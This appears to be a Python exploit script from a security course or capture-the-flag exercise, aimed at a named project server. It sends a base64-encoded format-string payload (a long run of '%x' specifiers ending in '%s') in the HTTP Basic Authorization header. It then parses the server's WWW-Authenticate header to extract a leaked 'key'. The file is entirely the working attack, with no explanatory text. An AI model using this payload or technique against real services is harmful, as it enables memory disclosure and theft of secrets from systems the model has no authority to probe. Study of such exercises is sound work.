import requests
import json
import re

url = 'http://project-2.csec.chatzi.org:8000/'
headers = {
    'Content-Type': 'application/json',
    'Authorization': 'Basic JXgleCV4JXgleCV4JXgleCV4JXgleCV4JXgleCV4JXgleCV4JXgleCV4JXgleCV4JXgleCV4JXgleCV4JXgleCV4JXgleCV4JXgleCV4JXgleCV4JXgleCV4JXgleCV4JXgleCV4JXgleCV4JXgleCV4JXgleCAgIC0gICAlczox'

}
data = {
    'test': 'example'
}
response = requests.post(url, headers=headers, data=data)

if response.status_code == 200:
    
    print(response.headers)
    print(response.text)

else:
    print('Error:', response.headers)

x=list(response.headers['WWW-Authenticate'].split("   -   "))

key=re.sub(r'"', '', x[1])

print("key is:" + key)